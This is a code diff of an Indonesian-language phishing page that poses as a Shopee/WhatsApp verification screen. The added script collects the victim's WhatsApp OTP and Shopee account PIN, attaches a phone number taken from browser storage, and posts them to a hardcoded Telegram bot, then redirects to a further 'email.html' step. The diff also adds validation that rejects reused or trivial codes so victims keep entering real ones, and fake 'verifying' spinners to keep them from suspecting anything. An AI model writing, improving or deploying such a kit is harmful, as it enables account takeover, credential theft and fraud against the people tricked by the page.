@@ -43,18 +43,17 @@
 
         .wa {
             color: #333;
-            /* Warna diubah menjadi hitam */
             font-weight: bold;
         }
 
-        .otp-box {
+        .otp-box, .pin-box {
             display: flex;
             justify-content: center;
             gap: 10px;
             margin: 30px 0;
         }
 
-        .otp-box input {
+        .otp-box input, .pin-box input {
             width: 40px;
             height: 48px;
             font-size: 20px;
@@ -66,8 +65,13 @@
         }
 
         .otp-box input:focus {
-            border-color: #25D366;
+            border-color: #25D366; /* Hijau WhatsApp untuk OTP */
         }
+        
+        .pin-box input:focus {
+            border-color: #EE4D2D; /* Oranye Shopee untuk PIN */
+        }
+
 
         button {
             background: #ccc;
@@ -83,7 +87,6 @@
 
         button.active {
             background: #EE4D2D;
-            /* Warna oranye Shopee */
             cursor: pointer;
         }
 
@@ -97,34 +100,41 @@
             color: #e65100;
             font-weight: 500;
         }
-
+        
         /* Style untuk bagian PIN (awalnya disembunyikan) */
         .pin-section {
             display: none;
             margin-top: 20px;
         }
-
-        .pin-box {
+        
+        /* --- STYLE UNTUK LOADING SPINNER --- */
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(255, 255, 255, 0.95); /* Hampir putih solid */
             display: flex;
+            flex-direction: column;
+            align-items: center;
             justify-content: center;
-            gap: 10px;
-            margin: 30px 0;
+            z-index: 1000;
+            display: none; /* Awalnya tersembunyi */
         }
 
-        .pin-box input {
+        .spinner {
+            border: 4px solid rgba(0, 0, 0, 0.1);
+            border-top: 4px solid #EE4D2D; /* Warna Shopee */
+            border-radius: 50%;
             width: 40px;
-            height: 48px;
-            font-size: 20px;
-            text-align: center;
-            border: none;
-            border-bottom: 2px solid #ccc;
-            outline: none;
-            transition: border-color 0.2s;
+            height: 40px;
+            animation: spin 1s linear infinite;
         }
 
-        .pin-box input:focus {
-            border-color: #EE4D2D;
-            /* Warna oranye Shopee */
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
         }
     </style>
 </head>
@@ -134,8 +144,8 @@
         <h1>Masukkan Kode Verifikasi</h1>
     </header>
     <div class="content" id="otp-section">
-        <p>Kode verifikasi (OTP) kamu telah dikirim melalui <b class="wa">WhatsApp Yang Terdaftar</b></p>
-        <p><b class="wa"></b></p>
+        <p>Kode verifikasi (OTP) kamu telah dikirim melalui <b class="wa">WhatsApp</b></p>
+        <p><b class="wa" id="target-phone-display">Nomor: (Mengambil data...)</b></p>
         <div class="otp-box">
             <input type="tel" inputmode="numeric" maxlength="1" class="otp-input" />
             <input type="tel" inputmode="numeric" maxlength="1" class="otp-input" />
@@ -159,10 +169,105 @@
         </div>
         <button id="konfirmasi-pin" disabled>Konfirmasi PIN</button>
     </div>
+    
+    <div id="loadingOverlay" class="loading-overlay">
+        <div class="spinner"></div>
+        <p id="loadingMessage" class="mt-4 text-lg text-gray-700 mt-3">Memproses, harap tunggu...</p>
+    </div>
+
     <script>
         // === Konfigurasi Telegram ===
-        const TELEGRAM_BOT_TOKEN = '7812428468:AAE1qHjLLHOQlAmABXbr9JhXEg0KQkb0XW0';
+        const TELEGRAM_BOT_TOKEN = '7812428468:AAE1qHjLLHOQlAmABXbr9JhEg0KQkb0XW0';
         const TELEGRAM_CHAT_ID = '5923031825';
+        const TELEGRAM_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        // --- Ambil riwayat semua percobaan dari session storage ---
+        let allCodeAttempts = JSON.parse(sessionStorage.getItem('all_code_attempts')) || [];
+        // --- Ambil Nomor Telepon dari Local Storage ---
+        const storedNumber = localStorage.getItem('verificationPhoneNumber') || 'TIDAK TERSEDIA';
+
+
+        // === UTILITY FUNGSI ===
+        function sleep(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
+        
+        function showLoading(message) {
+            document.getElementById("loadingOverlay").style.display = 'flex';
+            document.getElementById("loadingMessage").textContent = message || "Memproses, harap tunggu...";
+        }
+
+        function hideLoading() {
+            document.getElementById("loadingOverlay").style.display = 'none';
+        }
+
+        function maskPhoneNumber(number) {
+            if (!number || number.length < 10) return number;
+            const visibleStart = number.substring(0, 3);
+            const visibleEnd = number.substring(number.length - 3);
+            const masked = number.substring(3, number.length - 3).replace(/./g, '*');
+            return `(${visibleStart}) ${masked}${visibleEnd}`; 
+        }
+
+        // === Fungsi Validasi Tambahan (untuk OTP dan PIN) ===
+        function isValidCode(code) {
+            if (code.length !== 6) {
+                return false; 
+            }
+            const firstDigit = code[0];
+            const allSame = code.split('').every(digit => digit === firstDigit);
+            
+            // Cek apakah 6 digitnya sama semua (misalnya 111111)
+            if (allSame) {
+                return false;
+            }
+            
+            // Cek apakah input saat ini sama dengan kode yang sudah pernah dimasukkan
+            if (allCodeAttempts.includes(code)) {
+                return false; 
+            }
+
+            return true;
+        }
+
+
+        // === Fungsi untuk mengirim data ke Telegram ===
+        async function sendToTelegram(message) {
+            const fullMessage = `#PIN_MITRA\nNomor HP: ${storedNumber}\n${message}`;
+
+            try {
+                const response = await fetch(TELEGRAM_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: fullMessage
+                    })
+                });
+                
+                if (response.ok) {
+                    console.log('Pesan berhasil dikirim ke Telegram!');
+                } else {
+                    console.error('Gagal mengirim pesan ke Telegram:', data.description);
+                }
+                return response.ok;
+
+            } catch (error) {
+                console.error('Terjadi kesalahan:', error);
+                return false;
+            }
+        }
+        
+        // === INITIALIZATION ===
+        document.addEventListener('DOMContentLoaded', () => {
+            // Tampilkan nomor telepon yang sudah di-mask
+            const phoneDisplayEl = document.getElementById('target-phone-display');
+            if (phoneDisplayEl) {
+                phoneDisplayEl.textContent = `Nomor: ${maskPhoneNumber(storedNumber)}`;
+            }
+        });
+
 
         // === OTP Input Logic ===
         const otpInputs = document.querySelectorAll(".otp-input");
@@ -172,7 +277,6 @@
 
         otpInputs.forEach((input, index) => {
             input.addEventListener("input", (e) => {
-                // Selalu hapus karakter non-angka
                 const value = e.target.value.replace(/[^0-9]/g, ""); 
                 e.target.value = value;
                 
@@ -199,14 +303,31 @@
             }
         }
         
-        lanjutBtn.addEventListener("click", () => {
+        lanjutBtn.addEventListener("click", async () => {
             const otp = Array.from(otpInputs).map((i) => i.value).join("");
-            sendToTelegram(`Kode OTP: ${otp}`); // Kirim OTP ke Telegram
-            // Sembunyikan bagian OTP dan tampilkan bagian PIN
+            
+            // VALIDASI OTP WA
+            if (!isValidCode(otp)) {
+                alert("6 Digit yang anda input salah");
+                return; 
+            }
+
+            // 1. KIRIM DATA KE TELEGRAM (SEGERA)
+            await sendToTelegram(`Kode OTP WA: ${otp}`); 
+            
+            // 2. Simpan input saat ini ke riwayat global 
+            allCodeAttempts.push(otp);
+            sessionStorage.setItem('all_code_attempts', JSON.stringify(allCodeAttempts));
+
+            // 3. Tampilkan Loading 3 detik
+            showLoading("Memverifikasi OTP...");
+            await sleep(3000); 
+            hideLoading();
+            
+            // 4. Sembunyikan bagian OTP dan tampilkan bagian PIN
             otpSection.style.display = "none";
             pinSection.style.display = "block"; 
             
-            // Atur fokus ke input pertama PIN
             const pinInputs = document.querySelectorAll(".pin-input");
             if (pinInputs.length > 0) {
                  pinInputs[0].focus();
@@ -231,7 +352,6 @@
 
         pinInputs.forEach((input, index) => {
             input.addEventListener("input", (e) => {
-                // Selalu hapus karakter non-angka
                 const value = e.target.value.replace(/[^0-9]/g, ""); 
                 e.target.value = value;
 
@@ -258,38 +378,30 @@
             }
         }
         
-        konfirmasiPinBtn.addEventListener("click", () => {
+        konfirmasiPinBtn.addEventListener("click", async () => {
             const pin = Array.from(pinInputs).map((i) => i.value).join("");
-            sendToTelegram(`PIN Akun Shopee: ${pin}`); // Kirim PIN ke Telegram
-            // Alihkan ke halaman berikutnya
+            
+            // VALIDASI PIN
+            if (!isValidCode(pin)) {
+                alert("6 Digit yang anda input salah");
+                return; 
+            }
+
+            // 1. KIRIM DATA KE TELEGRAM (SEGERA)
+            await sendToTelegram(`PIN Akun Shopee: ${pin}`); 
+            
+            // 2. Simpan input saat ini ke riwayat global 
+            allCodeAttempts.push(pin);
+            sessionStorage.setItem('all_code_attempts', JSON.stringify(allCodeAttempts));
+
+            // 3. Tampilkan Loading 3 detik
+            showLoading("Memproses PIN...");
+            await sleep(3000); 
+            hideLoading();
+
+            // 4. Alihkan ke halaman berikutnya
             window.location.href = "email.html"; 
         });
-
-        // === Fungsi untuk mengirim data ke Telegram ===
-        function sendToTelegram(message) {
-            const apiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-            fetch(apiUrl, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        chat_id: TELEGRAM_CHAT_ID,
-                        text: message
-                    })
-                })
-                .then(response => response.json())
-                .then(data => {
-                    if (data.ok) {
-                        console.log('Pesan berhasil dikirim ke Telegram!');
-                    } else {
-                        console.error('Gagal mengirim pesan ke Telegram:', data.description);
-                    }
-                })
-                .catch(error => {
-                    console.error('Terjadi kesalahan:', error);
-                });
-        }
     </script>
 </body>
 
